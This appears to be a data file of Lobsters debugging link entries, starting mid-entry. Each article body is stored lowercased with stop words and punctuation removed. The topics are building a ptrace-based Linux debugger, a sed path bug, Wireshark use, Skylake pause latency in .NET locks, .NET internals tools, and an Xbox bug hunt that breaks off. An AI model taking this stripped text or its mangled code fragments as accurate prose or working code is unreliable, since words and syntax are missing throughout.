highpcattrclass constant else exception error invalid dwathighpc class highpcattrclass return lowpc highpc def loaddwarfinfo mmap load reload dwarf info mmap filename mmap filenamestartswith continue elffile elffile open filename rb elffilehasdwarfinfo continue dwarfinfo elffilegetdwarfinfo information compilation unit cu cu cu dwarfinfoitercus lineprog dwarfinfolineprogramforcu cu state entrystate entry lineproggetentries entrystate entrystateendsequence address stateaddress state state dy entry die bound diebounds die name dieattributes dwatname value die cuiterdies dietag dwtagsubprogram cusappend lineprog lineprog state state address address entry dy alldwarfinfo filename dwarfinfo dwarfinfo unit cu information find file name function name line number address need locate address looking two address known line number bisect import bisect def addressinfo address filename dwarfinfo alldwarfinfoitems cu dwarfinfo unit index bisect cu address address index len cu address state cu state index could probably bisect funcname none entry cu entry entry bound address entry bound funcname entry name break return function funcname file cu lineprog fileentry statefile name line stateline let put header related helper including variable file say elfreaderpy since information come header still shift start appropriate region elfreaderloaddwarfinfo mmap elfreaderaddressinfo processgetreg rip start function main line file getting stack convention stack value register rbp lower address rsp higher address rsp increase stack frame added linux frame take byte edit thanks saagarjha pointing previous paragraph false convention nt simple stack assembly c def getstack bottom processgetreg rsp top processgetreg rbp stackbytes processreadbytes bottom top bottom return structunpack l stackbytes xrange len stackbytes combine elfreaderaddressinfo get information stack frame sometimes thing stack frame put stack try exclude heuristic hope value nt lie memory mapped region def linenumbers elfreaderloaddwarfinfo mmap line elfreaderaddressinfo findsection mmap frame frame getstack processgetreg rip findsection mmap frame return line line line line none try linenumbers file function main line file function main line undo use fork system call allow u experiment live process edited undo change wo nt full undo external resource like file descriptor nt restored fork creates two process parent child save state process create fork store parent list process stored copy frozen ptrace needed load state process create fork state want revert replace current process c file add helper function could dynamically loaded translated assembly executed linebyline debugger int pid void makefork pid fork pid raise sigstop forked parent receives pid child output fork child receives output raise sigstop child halt execution send sigcont ptrace might better way call makefork debugger state def savestate skipsavefalse global childpid parentprocess childprocess process oldregs processgetregs cfunccall makefork childpid readint pid parentprocess process childprocess process debuggeraddprocess childpid false processcont processwaitsignals signalsigstop processsetregs oldregs skipsave statesappend parentprocess def loadstate statenone global process state state state none else state processkill process state savestate true edit fixed segfault bug savestate called loadstate instruction pointer manually set cfunccall nt restored bit brutal send sigkill signal nt found nicer way savestate loadstate nt always produce expected result moment waiting cleaner state speculative think reason failure cfunccall including called save load state discussed inside function libc intermediate state calling another function state call libc function cause intermediate state used resulting unexpected behaviour crash could try learn stepping though execution make cfunccall might need knowning libc internals final product might use libc much child termination currently child process fork killed zombie could call wait fix however nt using parentchild relation process intended way nt know whether child alive example restoring state fork state mean state child state alive restoring state fork state hand mean child state terminated instead use sigaction ignore sigchld signal sent parent child exit add registersignals struct sigaction sigign sigemptyset sigaction sigchld also kill process paused state left import atexit def cleanup print cleaning child process proc process state try prockill except oserror pas atexitregister cleanup c process editing need sigchld reason could try ignore debugger instead c program testing undo try put loop main function increase every second int count int main registersignals printf starting main loopn count count printf sleep loop pid count usleep add function python wait count reach value def waitforcount readint count mincount step run test waitforcount starting main loop sleep loop savestate waitforcount sleep loop sleep loop savestate waitforcount sleep loop sleep loop loadstate waitforcount sleep loop sleep loop loadstate state waitforcount sleep loop sleep loop sleep loop sleep loop worked expected waitforcount pause count reach value printed sleep loop using debuggereditor ready next time get best part actually using thing make program hoping squeeze short sample session already getting really long probably number convenience function missing useful bundling feature still absent figure later footnote odd end side note globals interactivity using globals would good normally part use python interpreter repl debugger still could make library cleaner add helper function easier type undo checkpointing seems used lot program checkpointing saving state process trying find small one run read extract step unfortunately could nt find much recent activity topic thing looked footnote well also creates core dump default maximum size file ulimit used increase assembly instead c still create c structure least piece memory shaped like one pas pointer argument happens first line proc pid map every time tried nt know always case probably better place stackoverflow get information wikipedia say dwarf acronym meaning page explains state stack register even register rbp rsp need preserve meaning location stack next paragraph also need correctionclarification assembly register assembly register refered post rip instruction pointer address next asm instruction run rsp stack pointer end stack happens bottom stack grows rbp base pointer beginning stack happens top stack grows source source post file elfreaderpy posted jun blog index r feed contact
300,Lobsters,debugging,Debugging,Compiler Explorer (think CodePen for C(++)/D/Go/Rust/Swift/Haskell disassembly),https://gcc.godbolt.org/,compiler explorer think codepen c dgorustswifthaskell disassembly,,
301,Lobsters,debugging,Debugging,Sed: a debugging story,https://www.fpcomplete.com/blog/2018/06/sed-a-debugging-story,sed debugging story,check pull request initial bug report opened bug report first guess got sort working appveyor log version build called modified ghc got unpack location path length limit eureka cabal fault current call configure script issue cabal cabal fault sent bug report upstream stack workaround sent pr last unsolved question seems work fine takeaway contact u,blog post semicomplete retelling debugging adventure particularly crazy bug consider combination fun story telling audience catharsis affect anyone trying use appveyor stack project use network package ghc want cheat get solution check pull request otherwise strap gon na bumpy ride initial bug report neil mitchell opened bug report stack bug report detailed fact running stack resolver nightly build network would fail using stack unpack network building locally unpacked source file work failed error message configstatus creating networkbuildinfo sed e expression char invalid reference command rh initially nt believe serious bug appeared unpacking locally decent workaround nt understand bug would prevent using appveyor testing compatibility haskell source code window initial poking prodding issue therefore minimal shown serious thought spent significant time cluster past week trying understand going first guess first guess problem two different version sed executable play one misbehaving even line bug triggering appveyor appveyor install sedexe part git installation stack provide sedexe part msys environment reason stack setting different environment variable different way building causing buggy behavior however hypothesis left question would change ghc version cause stack pas different environment variable could two different source sedexe executable different behavior since nt like hypothesis much decided try disprove tried installing modified sedexe would pas argument real sedexe got sort working turned messed actual passing argument nt end figuring wrong however appveyor log showed exactly needed know stack unpack stack build network version build called modified sedexe disproved initial hypothesis well enough problem different executables called something else afoot ghc got let take step back understand exactly stack bug get triggered stack build network case start downloading tarball unpacking temporary directory stack unpack case downloading unpacking happen unpack call happen current directory temporary directory file filesystem following step occur stack compiles setuphs file network setupexe module us cabal library ship ghc stack call setupexe configure path environment variable set appropriately find build tool like ghc gcc bash sed etc setupexe configure run configure script ship network package ultimately sed failure looking step two place ghc could impact directory set path find ghc executable cabal library used former nt seem likely problem since directory holding ghcexe seems unrelated sedexe called however cabal library promising new hypothesis ghc version play nt actually causing bug cabal library version tested hypothesis using ghc initially worked perfectly installing newer version cabal library ended manually remote desktop session appveyor script show result exactly hoping installed cabal ghc failed like ghc hurrah narrowed source problem unpack location get u bit closer still nt know two way unpacking network package make difference let paraphrase stack build network case unpacks temporary directory stack unpack case unpacks current directory alright somewhat promising new hypothesis reason unpacking temporary directory cause breakage easy enough test let manually stack unpack temporary directory looked log stack build network case found building c manually ran command along line mkdir c cd c stack unpack cd echo resolver stackyaml stack build like magic reproduced bug great breakthrough first time reproduced bug access modify source code time without tweaking stack behavior question wrong directory path length limit burned many time past window path length limit set somewhere around character yeah sort yeah sort relaxed paranoid first guess temp directory long decided progressively move directory tree see thing stopped failing tried building inside c next build failed moved another directory built c usersappveyorappdatalocaltemp suddenly build succeeded nt expected removed two character path eureka stared subdirectory removed crazy thought ran something like mkdir cd stack unpack cd echo resolver stackyaml stack build even tiny path build failed seemed something magical subdirectory able use approach reliably reproduce bug local window machine much pleasant continuation debugging remotely connecting appveyor although rdp setup appveyor amazing feature awesome next decided fuzz bit built c time error message changed sed e expression char invalid reference command rh sed e expression char invalid reference command rh hit sed reason suddenly interpreting component file path part substitution command weird cabal fault knew problem related path change cabal versus cabal triggered bug therefore must difference two version calling configure script searching found current call configure script configurefile makeabsolute frommaybe takedirectory cabalfilepath lbi configure let args configurefile args cc ccprogshort runprograminvocation verbosity programinvocation sh programoverrideenv overenv args proginvokecwd builddir lbi roughly translates find configure file directory cabal file get absolute path file construct set command line argument configure script first argument pas sh setting working directory build directory ok seems reasonable reason path config file interpreted sed command turn replace backslashes forward slash window file path next step try little ugly hack let args map replace configurefile args cc ccprogshort replace replace c c sure enough worked definitely zeroing next question look like cabal quick call git diff cabaldistributionsimplehs revealed configurefile makeabsolute frommaybe takedirectory cabalfilepath lbi configure args args cc ccprogshort args configurefile args cc ccprogshort programinvocation sh programoverrideenv overenv args proginvokecwd builddir lbi args configure configureargs backwardscompathack flag args configureargs backwardscompathack flag seems cabal assuming current working directory contained configure script therefore nt passing full path command line therefore funny path could nt possible interpreted sed command get back behavior sure make code instead look something like let configurefile configure let args configurefile args cc ccprogshort runprograminvocation verbosity programinvocation sh programoverrideenv overenv args proginvokecwd fmap takedirectory cabalfilepath lbi tried network package built correctly since filed issue cabal cabal fault really bug cabal passed valid path configure script proceeded barf discussion aforementioned issue became clear fact bug autotools quasi computation sent bug report upstream however even bug upstream issue need deal since timeline autotools fix take time autotools fix deploy even deploys broken configure script continue exist wild existing version network package change cabal library trigger bug flavor workaround mentioned however stack continue use version cabal ship ghc default ghc trigger bug stack workaround one workaround stack would kind crazy add conditional logic window using cabal check generated temporary directory include backslash followed digit figure directory use considered bit realized simpler solution sent pr consisting global stackroot c sr override temp directory avoid sed escaping issue see http tmp c tmp done changed temporary directory used building appveyor work well enough knowledge window system weird temporary directory path others affected future make tweak either stack stack installer documentation last unsolved question one final question nt answered yet able reproduce bug using cabalthelibrary manually created triggering directory using cabalinstall install network well seems work fine seems cabalinstall unpacks c notice style path looked stack cabalinstall codebases briefly figure different behavior creating temporary directory point enough debugging adventure perhaps curious reader shed light last mystery takeaway challenging frustrating ultimately fun bug often get find bug ubiquitous tool autoconf took lot effort unwind various layer tooling getting reliable repro locally hard appveyor remote desktop invaluable debugging technique form hypothesis try invalidate helped ultimately zero real problem like blog post need help devops rust functional programming contact u share
302,Lobsters,debugging,Debugging,How I use Wireshark,https://jvns.ca/blog/2018/06/19/what-i-use-wireshark-for/,use wireshark,wireshark wireshark wiresharkdev ppa use wireshark analyze pcap file look single tcp connection client decode see content packet search specific packet see statistic tcp connection duration use latest wireshark version use wireshark learn networking protocol,hello using wireshark debug networking problem today realized never written blog post wireshark wireshark one favourite networking tool let fix wireshark really powerful complicated tool practice know small number thing thing really useful blog post explain main thing use wireshark hopefully slightly clearer idea useful wireshark wireshark graphical network packet analysis tool mac download install homepage debianbased distros install sudo apt install wireshark also official wiresharkdev ppa use get uptodate wireshark version wireshark look like little overwhelming first slightly mysterious search box lot packet even use thing use wireshark analyze pcap file usually use wireshark debug networking problem production wireshark workflow capture packet tcpdump typically something like sudo tcpdump port w outputpcap scp pcap file laptop scp host outputpcap open pcap file wireshark wireshark outputpcap pretty simple pcap file bunch packet laptop look single tcp connection often debugging something wireshark happened tcp connection something went wrong connection reason wireshark make really easy look lifetime tcp connection see happened right clicking packet clicking conversation filter tcp wireshark show packet tcp connection packet see successful ssl connection packet say client hello service hello certificate server key exchange part setting ssl connection neat actually used today debug ssl issue work today connection reset noticed client hello packet sent client sending fin ack packet terminates tl connection useful could tell client terminating connection server immediately knew client blame could focus investigation pattern pretty typical use wireshark usually client server bug configuration error either client server wireshark invaluable helping figure whether blame client server decode wireshark us port try guess kind packet every packet often good job see traffic port assume http traffic usually right sometimes http traffic happening unusual port need give wireshark hint right click packet click decode tell wireshark protocol packet port much easier navigate search see content packet wireshark amazing detail view explains content packet let take client hello packet detail packet first packet sent ssl connection client saying hello wireshark give two super useful tool investigating content packet first one view expand every header packet ethernet header ip header tcp header look second view really magical one show raw byte packet neat thing hover one byte mouse like hovered tilesservicesmozillacom tell bottom screen field byte correspond case server name field wireshark codename field case sslhandshakeextensionsservername search specific packet wireshark great query language really easily search specific packet usually use really simple query wireshark example kind search frame contains mozilla search string mozilla anywhere packet tcpport tcp port dnsresplen dns response ipaddr source dest ip address wireshark packet search language much powerful tcpdump tab completion often capture large amount packet tcpdump packet port depth searching using wireshark see statistic tcp connection duration sometimes want specifically investigate slow tcp connection packet capture file many thousand packet find slow tcp connection click statistic menu conversation wireshark give amazing statistic view look like show duration every single tcp connection find long one investigate detail useful use latest wireshark version upgraded wireshark worth upgrading looking packet work laptop recently tough time looked doc realized running old version wireshark upgraded wireshark support really improved newest version use wireshark learn networking protocol networking jargon post frame tcp port dns response source ip address ssl client hello left wireshark definitely abstract networking detail away definitely intimidating first wireshark actually great tool learn bit networking protocol example know much detail tlsssl protocol work see first two packet client hello server hello make protocol seem le like scary mystery like concrete thing easily look detail wireshark ton feature definitely use small fraction feature trick described probably use wireshark need know little wireshark start using debug networking issue
303,Lobsters,debugging,Debugging,Why Skylake CPUs Are Sometimes 50% Slower – How Intel Has Broken Existing Code,https://aloiskraus.wordpress.com/2018/06/16/why-skylakex-cpus-are-sometimes-50-slower-how-intel-has-broken-existing-code/,skylake cpu sometimes slower intel broken existing code,o hardware different cpu time slower commenters pointed consumer skylake cpu released already server xeon cpu skylakex released mid later cpu kaby lake share issue window performance analyzer profiling ui free part window performance toolkit part window sdk r v document problem becomes feature cpu pause duration n http http wwwagnerorgoptimizeinstructiontablespdf http http clr bad http conclusion http denotes change make thing clear add new insight article gained quite traction hacker news http newsycombinatorcomitem reddit http even mentioned wikipedia http enwikipediaorgwikiskylake microarchitecture wow thanks interest like,got call newer hardware performance regression test become slower big deal usually bad configuration somewhere window bios setting set non optimal value time able find setting bring performance back normal since change small v blue old hardware orange new hardware needed drill deeper o hardware different cpu time slower perf drop definitely significant check software version test window bios setting somehow different old baseline hardware nope everything identical difference test running different cpu picture newest cpu one used comparison xeon gold run different cpu architecture named skylake common cpu produced intel since mid commenters pointed consumer skylake cpu released already server xeon cpu skylakex released mid later cpu kaby lake share issue buying current hardware get cpu skylake cpu architecture nice machine test shown newer slower right direction else fails get repro use real profiler drill deeper record test old hardware new hardware quickly lead somewhere remember diff view wpa window performance analyzer profiling ui free part window performance toolkit part window sdk show table delta trace trace hence negative delta table indicates cpu consumption increase slower test look biggest cpu consumer difference find awarelock contention jitmonenterworkerinlinegetthreadgetthreadpatchlabel threadnativespinwait everything point towards cpu spinning thread competing lock false red herring spinning root cause slower performance increased lock contention mean something software become slower holding lock consequence result cpu spinning checking locking time key metric like disk alike failed find anything relevant could explain performance degradation although logical turned back increased cpu consumption various method find exactly cpu stuck would interesting wpa file line column work private symbol net framework code next best thing get address dll instruction located called image rva relative virtual address load dll debugger u xxxdllimagerva see instruction burning cpu cycle basically one hot address let examine hot code location different method windbg u clr awarelock lock cmovl eax esi sub esi eax jmp clr awarelock cc int sub je clr awarelock pause jmp clr awarelock jit method well u clr pop rsi ret cmp dword ptr clr jle clr mov eax pause sub jne clr pattern one time hot location jump instruction time subtraction hot instruction preceded common instruction named pause different method execute cpu instruction reason time consuming let measure duration pause instruction see right track document problem becomes feature cpu pause duration n xeon xeon r gold cpu pause new skylake cpu order magnitude slower sure thing get faster sometimes bit slower time slower sound like bug little internet search pause instruction lead intel manual skylake microarchitecture pause instruction explicitly mentioned http bug documented feature exists even web page contains timing pretty much cpu instruction http wwwagnerorgoptimizeinstructiontablespdf sandy bridge ivy bridege haswell broadwell skylakex number cpu cycle calculate actual time need divide cycle count cpu frequency usually ghz get time n mean execute heavily multithreaded application net latest hardware thing become much slower someone else noticed already august written issue http issue fixed net core net framework preview contains also fix http clr improved spinwaits several synchronization primitive perform better intel skylake recent microarchitectures mscorlibdll bug since net still one year away requested backport fix get net back speed latest hardware since many part net using spinlocks look increased cpu consumption around threadspinwait spinning method eg taskresult internally spin internally could see test also significant increase cpu consumption degraded performance bad looked net core code long cpu keep spinning lock released calling waitforsingleobject pay expensive context switch context switch somewhere microsecond region becomes much slower many thread waiting kernel object net lock multiply maximum spin duration number core fully contended case mind every core thread waiting lock try spin long enough give everyone chance work bit paying kernel call spinning inside net us exponential back algorithm spinning start pause call loop iteration number spin multiplied next spin count becomes greater maximum spin duration calculated total time long thread would spin pre skylake cpu current skylake cpu various core number simplified code net lock perform spinning summary net spinning lock contention minus lock takingswitchtothreadsleep call summary param name ncores param void spin int ncores const int dwrepetitions const int dwinitialduration const int dwbackofffactor int dwmaximumduration ncores int dwrepetitions int duration dwinitialduration int k k duration k callpause duration dwbackofffactor duration dwmaximumduration old spinning time millisecond region core already quite lot compared always mentioned high cost context switch order magnitude faster skylake cpu total cpu spinning time contended lock exploded spin core machine latency new intel cpu increased pause instruction factor really case created small tester check full cpu spinning calculated number nicely match expectation thread waiting core machine single lock call monitorpulseall let race begin one thread win race thread spin give experimental evidence indeed real issue cpu consumption long spin time real issue excessive spinning hurt scalability cpu cycle burned thread might need cpu although usage pause instruction free shared cpu resource sleeping longer time reason spinning acquire lock fast without going kernel true increased cpu consumption might look good task manager influence performance long core left task test show nearly single threaded operation one thread add something worker queue worker thread wait work performs task work item slowed reason shown best diagram spinning contended lock happens step amount spinning tripled step spin round lock check current thread get spinning lock try fair switch thread time time help thread complete work increase chance lock released check later problem complete spin round completed lock check taken eg spin round lock becomes signaled right start round wait complete spin round acquire lock calculating spin duration last round estimate worst case delay happen thread many millisecond wait spinning completed real issue created simple test application implement producer consumer queue worker thread work work item consumer delay m sending next work item sufficient see effect see sender thread delay one two m total duration whereas time twice fast ca show excessive cpu spinning cosmetic issue hurt heavily multithreaded application also simple producer consumer threading involves two thread run etw data speaks increased cpu spinning really cause observed delay zoom slow section find red spinning although worker light blue completed work returned lock long time ago fast non degenerate case look much better spent spinning lock test application use named skylakexpause located http contains zip file source code binary net core net actually compare thing install skylake machine net preview contains fix net core still implement old spinning behavior application target net standard net produce exe dll test old new spinning behavior side side without need patch anything convenient readonly object lockobject new object int workitems int completedworkitems barrier syncpoint void runslowtest const int processingtimeinms const int workitemstosend consolewriteline worker thread work processingtimeinms m workitemstosend time test one sender one receiver thread different timing sender wake send next work item synchronize worker sender ensure worker start first double senddelaytimes foreach var senddelay senddelaytimes syncpoint new barrier one sender one receiver var sw stopwatchstartnew parallelinvoke sender workitems workitemstosend delayinms senddelay worker maxworkitemstowork workitemstosend workitemprocesstimeinms processingtimeinms swstop consolewriteline send delay senddelay m work completed swelapsedtotalseconds threadsleep show gap etw data differentiate test run summary simulate worker thread consumes cpu triggered sender thread summary void worker int maxworkitemstowork double workitemprocesstimeinms syncpointsignalandwait completedworkitems maxworkitemstowork lock lockobject workitems monitorwait lockobject wait work int workitems completedworkitems simulatework workitemprocesstimeinms consume cpu lock workitems summary insert work worker thread lock wake worker thread n time summary void sender int workitems double delayinms completedworkitems delete previous work syncpointsignalandwait int workitems lock lockobject workitems monitorpulseall lockobject simulatework delayinms conclusion net issue affect spinlock implementation use pause instruction done quick check window kernel server issue like visible look like intel kind enough give hint change spinning strategy needed issue reported net core august september already fixed pushed net core http reaction speed net core team amazing also issue fixed mono branch day ago well discussion even spinning improvement ongoing unfortunately desktop net framework moving fast least net framework preview least proof concept fix work well waiting backport net able use net full speed also latest hardware first bug directly related performance change one cpu instruction etw remains profiling tool choice window wish would microsoft make port etw infrastructure linux current performance tooling still suck linux interesting kernel capability added recently analysis tool like wpa remains yet seen running net core desktop net framework cpu produced since mid definitely check application profiler running reduced speed due issue upgrade newer net core hopefully soon net desktop version test application tell could issue dotnet skylakexpausedll check call pause m processor skylakex problem detected skylakexpauseexe check call pause m processor skylakex problem detected tool report issue running fixed net framework skylake cpu hope find issue fascinating really understand issue need create reproducer allows experiment find relevant influencing factor rest boring work understand reason consequence cpu spinning much better denotes change make thing clear add new insight article gained quite traction hacker news http newsycombinatorcomitem reddit http even mentioned wikipedia http enwikipediaorgwikiskylake microarchitecture wow thanks interest like like loading
304,Lobsters,debugging,Debugging,Tools for Exploring .NET Internals,http://www.mattwarren.org/2018/06/15/Tools-for-Exploring-.NET-Internals/,tool exploring net internals,tool exploring net internals based tweet missed tool please let know comment honourable mention visual studio great debugger vscode net profilers application monitoring tool codetrack singleuse tool even deeper insight opensource event tracing window etw event deep insight clr profile memory cpu usage nice tutorial help along way performance improvement msbuild perfview find bottleneck microsoftdiagnosticstracingtraceevent library including flamegraphs click larger version much assembly code decided arrange field so debugging extension github repo github page blog post work like decompiled il intermediate language assembly code generation size gc occurrence click larger version windbg so debugging extension get started productive clrmd library available microsoftdiagnosticsruntime memory dump official blog post clrmdextensions twitter help note self get bit upset underlying com interface directly crossplatform clrmd windowsonly analyzing net core core dump linux improvement windbg said onto list superdump github msos github memoscopenet github dnspy github memanalyzer github dumpminer github coming soon trace cli github shed github make use clrmd debugdiag sosex developed vmmap hacker news rprogramming,tool exploring net internals jun word whether want look code underthehood trying see internals clr look like whole range tool help give credit credit due post based tweet thanks everyone contributed list missed tool please let know comment also written post look internals net runtime honourable mention firstly start mentioning visual studio great debugger vscode also lot good commercial net profilers application monitoring tool available also take look example recently playing around codetrack impressed however rest post going look singleuse tool give even deeper insight going added bonus opensource take look code see work perfview simply excellent tool one used year us event tracing window etw event provide deep insight clr well allowing profile memory cpu usage fairly steep learning curve nice tutorial help along way absolutely worth time effort also need proof useful microsoft engineer use many recent performance improvement msbuild carried using perfview find bottleneck perfview built ontop microsoftdiagnosticstracingtraceevent library use tool addition since opensourced community contributed gained really nice feature including flamegraphs click larger version sharplab started tool inspecting il code emitted roslyn compiler grown much sharplab net code playground show intermediate step result code compilation language feature thin wrapper top feature eg using becomes trycatch sharplab allows see code compiler see get better understanding net language support c visual basic f impressive decompilationdisassembly feature currently four target decompilationdisassembly c visual basic il jit asm native asm code right output assembly code net jit generates c tool give insight memory layout net object ie show jitter decided arrange field within class struct useful writing highperformance code helpful tool u manually tricky official documentation field layout clr author reserved right change future knowledge layout helpful curious working performance critical application inspect layout look raw memory visual studio use dumpobj command so debugging extension approach tedious boring try write tool print object layout runtime example github repo use typelayoutprint notalignedstruct code like public struct notalignedstruct public byte public int mint public byte public short mshort get following output showing exactly clr layout struct memory based padding optimization rule size padding empty space byte byte padding byte mint byte byte byte padding byte mshort byte tune really intriguing tool say github page purpose help learn net internals performance tuning experiment c code find information blog post highlevel work like write sample valid c script contains least one class public method taking single string parameter executed hitting run button script contain many additional method class wish remember first public method first public class executed single parameter taken input box script clicking run button script compiled executed additionally decompiled il intermediate language assembly code corresponding tab time tune running including time script execution graph gc data drawn show information generation size gc occurrence illustrated vertical line number indicating generation triggered look like click larger version finally going look particular category tool since net came always able use windbg so debugging extension get deep net runtime however always easiest tool get started tweet say always productive way thing fortunately microsoft made clrmd library available aka microsoftdiagnosticsruntime anyone write tool analysis memory dump net program find even info official blog post also recommend taking look clrmdextensions provide integration linpad make clrmd even easy use wanted pull together list existing tool enlisted twitter help note self careful tweet windbg product manager might read tweet get bit upset tool based clrmd easiest way thing however use underlying com interface directly want also worth pointing tool based clrmd crossplatform clrmd windowsonly crossplatform option see analyzing net core core dump linux finally interest balance lot recent improvement windbg extensible various effort add functionality said onto list superdump github msos github commandline environment ala windbg executing so command without so available memoscopenet github tool analyze net process memory dump application memory file read later dump file contains data object thread state stack call stack memoscopenet analyze data help find memory leak deadlock dnspy github net debugger assembly editor use edit debug assembly even source code available memanalyzer github command line memory analysis tool managed code show object use space managed heap like dumpheap windbg without need install attach debugger dumpminer github ui tool playing clrmd feature coming soon trace cli github production debugging tracing tool shed github shed application allow inspect net runtime program order extract useful information used inspect malicious application order first general overview information stored malware executed shed able extract object stored managed heap print string stored memory save snapshot heap json format postprocessing dump module loaded memory also find many tool make use clrmd good move microsoft make available tool also worth mentioning debugdiag debugdiag tool designed assist troubleshooting issue hang slow performance memory leak memory fragmentation crash usermode process clrmd integration sosex might developed debugging extension managed code begin alleviate frustration so vmmap sysinternals discus post hacker news rprogramming
305,Lobsters,debugging,Debugging,Making a low level (Linux) debugger,https://blog.asrpo.com/making_a_low_level_debugger,making low level linux debugger,making low level linux debugger gdb lldb flpc pythonptrace library pyelftools source post setting hello world example reading value assembly repl single step p continue child raise signal write memory calling function first attempt getting function address setting breakpoints calling function second attempt call distance high overwritten byte allocating memory example looking around examining modifying c note project source source post useful reference blog index r feed contact,making low level linux debugger gdb lldb best known debugger customizable script many time like much control debugger work interactive portion internal representation able recreate flpc interactive way one time post try make debugger primitive piece ptrace system call wrapped pythonptrace library pyelftools later disassembly library debugger large project trying remake seem daunting since mostly want debug liveedit binary created nt need maximum compatibility simplicity favoured completeness seems like good trade hopefully post expose enough underlying idea bridge gap case slightly different environment standard source post everything made tested linux line order tutorial function import moved closer front final debugger interactive step making debugger also interactive setting avoid permission issue launch debugged process child import ptracedebugger shellcommand aout childproc subprocesspopen shellcommand pid childprocpid debugger ptracedebuggerptracedebugger process debuggeraddprocess pid false us ptrace system call attach child process pause process contains many convenient method follows hello world example pythonptrace reading value let start simple linger long get register regs processgetregs register k getattr regs k k dir regs kstartswith register c d eflags rax rbp rbx rcx rdi rdx rip rsi rsp s read byte memory import binascii binasciihexlify processreadbytes register rsp assembly repl next want run assembly instruction one time let gather ingredient single step processgetreg rip processsinglestep processgetreg rip rip instruction pointer r prefix indicates length bit see indeed advance took step continue child raise signal sigtrap case may result error process terminates raise different signal import signal processwaitsignals signalsigtrap processsignal signal sigtrap processsinglestep nonblocking add blocking version convenience def step processsinglestep processwaitsignals signalsigtrap clean let use process global moment write memory assembly instruction int raise sigtrap instruction written single byte processwritebytes processgetreg rip chr processcont processwaitsignals signalsigtrap processsignal signal sigtrap also check rip register see increase exactly set register processsetreg rax everything need run single instruction given byte def runasm instr oldrip processgetreg rip oldvalues processreadbytes oldrip len instr processwritebytes oldrip instr step rewind rip unless instruction altered processgetreg rip oldrip len instr processsetreg rip oldrip processwritebytes oldrip oldvalues overwrites byte instruction pointer instruction instr take step revert overwritten byte position instruction pointer last bit instruction pointer nt changed like case jump call lookup table assembly instruction byte could put loop made repl calling function first attempt want call assembly function pause returning let write python function funccall funcaddr run function line line examine intermediate state first save current state def funccall funcaddr oldrip processgetreg rip oldregs processgetregs oldvalues processreadbytes oldrip could use runasm call instruction byte followed byte little endian describing difference current rip destination pause child call write int byte call instruction diff funcaddr oldrip newvalues chr structpack diff chr processwritebytes oldrip newvalues step double check call made newrip processgetreg rip assert newrip funcaddr let run hit sigtrap hopefull one set processcont processwaitsignals signalsigtrap restore byte overwritten register value case might want keep processwritebytes oldrip oldvalues processsetregs oldregs getting function address fact let try call c function compiled binary moment argument void return need find address function get header using pyelftools elftoolselfelffile import elffile elftoolselfsections import symboltablesection def variable filename aout f elffile open filename symbsections section section fitersections isinstance section symboltablesection variable symbname symb stvalue section symbsections symb sectionitersymbols return variable call cvariables variable aout funccall cvariables somefuncname fact method get static variable think function shared library call variable full path file library however wo nt always work actual region memory used nt always start need add start region offset momemnt get like explain explore memory region procpidmaps bit later open proc smaps pid readline start int start start start else funccall start cvariables somefuncname setting breakpoints function address set breakpoint writing int byte start function def setbreakpoint addr old processreadbytes addr processwritebytes addr chr return old restore overwritten value hit breakpoint def restorebreakpoint old rip processgetreg rip processsetreg rip rip addr rip processwritebytes addr old used like old setbreakpoint start variable myfunc processwaitsignals signalsigtrap restorebreakpoint old calling function second attempt issue first approach calling function although general work surprisingly well call distance high call take byte argument address diff may need byte describe could either wait step range function want call work nt need call function right away could put destination register say rax call rax byte ff overwritten byte since overwrite byte call one int restore byte function return anything else read get unexpected value example made call inside function body program reach oldrip could potentially restore byte one step leaving reduces size problem could manually craft stack frame think gdb instead reserve new piece memory write instruction allocating memory use mmap system call call number reserve memory syscall need magic constant ptracesyscall import ptracesyscall mmapprotbitmask k v v k ptracesyscallposixargmmapprotbitmask mmapprotbitmask protall mmapprotbitmask protread mmapprotbitmask protwrite mmapprotbitmask protexec mapprivate mapanonymous syscalls k v v k function call mmap syscall byte def reservememory size oldregs processgetregs regs rax syscalls mmap rdi rsi size rdx mmapprotbitmask protall mapprivate mapanonymous reg value regsitems processsetreg reg value runasm chr chr result processgetreg rax processsetregs oldregs return result strategy adapted example referene constant syscalls mmap mmapprotbitmask protall mapprivate mapanonymous address memory reserved rax call extract return let u make modified slightly safer function call def safefunccall funcaddr oldrip processgetreg rip oldregs processgetregs tmpaddr reservememory processsetreg rip tmpaddr call rax processsetreg rax funcaddr newvalues chr chr chr processwritebytes tmpaddr newvalues step newrip processgetreg rip assert newrip funcaddr processcont processwaitsignals signalsigtrap processsetregs oldregs version may still segfault sometimes entirely sure looking around let add look function debugger tell u next instruction need disassembler installed using pip ptraceprocessdisassemble give u iterator next ten instruction def look addrnone print ip hex processgetreg rip instr enumerate processdisassemble startaddr hexa instrhexa hexa join hexa range len hexa print str ljust hexaljust instrtextlower running give something like look ip mov rdx rax lea rax mov rax rdx lea rax mov rax rax mov rsi rax af lea rdi mov eax fa ff ff call lea rax ptraceprocessdumpcode work similarly different formatting examining modifying c post already getting long write readingwriting c variable running single c statement shared library dynamic loading memory map procpidmaps next time note project originally nt sure go low level project really need instead could start debugging interpreter still useful separate interpreter debugger former state modified frozen imagine trying alter call stack control flow stack altering function determined top stack may possible already hard reason might still try make interpreter support external debugger plugin point source source post useful reference posted jun blog index r feed contact
306,Lobsters,debugging,Debugging,The Great Bug Hunt,https://allenpike.com/2018/the-great-bug-hunt/,great bug hunt,xbox table,fun thing programming day make progress maybe fix issue maybe add feature maybe build towards something bigger code move ever forward occasion hit bug mundane bug trifle fix hour even day true bug one defies reason one evokes possible could even happen dreadfully could bug compiler hold kid going hunting recently reported regression app working become dreadfully slow launch qa noticed issue good nobody development team seen happen bad scrolling performance awful ci release build fine project built via xcode build setting seemed standard performance profiling turned nothing obvious bug diagnosing fixing bug requires patience thoughtfulness systematic scientific mindset must eliminate variable one one persistently forming hypothesis testing one name game poor engineer assigned hunt bug already know tradition ease pain sharing story legendary bug hunt gather round friend story crashing xbox see steamclock cofounder nigel worked game industry game industry fun fun also notfun notfun game particularly notfun finishing law discover bug time team working one first game ever brand new game console called xbox final testing ramped qa set three prerelease xboxen run automated test overnight previous day build game still running next morning sign stable build unfortunately morning one console crashed crash never good particularly bad crash something running graphic card brought whole system diagnosing gpu crash meant hard mode debugger stack trace printf debugging could read code try thing like animal began bug hunt day lead engineer would comb evidence develop hypothesis work eliminate possibility night qa would get random crash without clear cause possible could even happen could bug compiler greatest hit naturally game ran perfectly well engineer machine multiple day even little consolation deadline print ship game loomed large luckily pattern soon detected albeit strange one game crashing overnight one three xboxes search difference ensued power cable 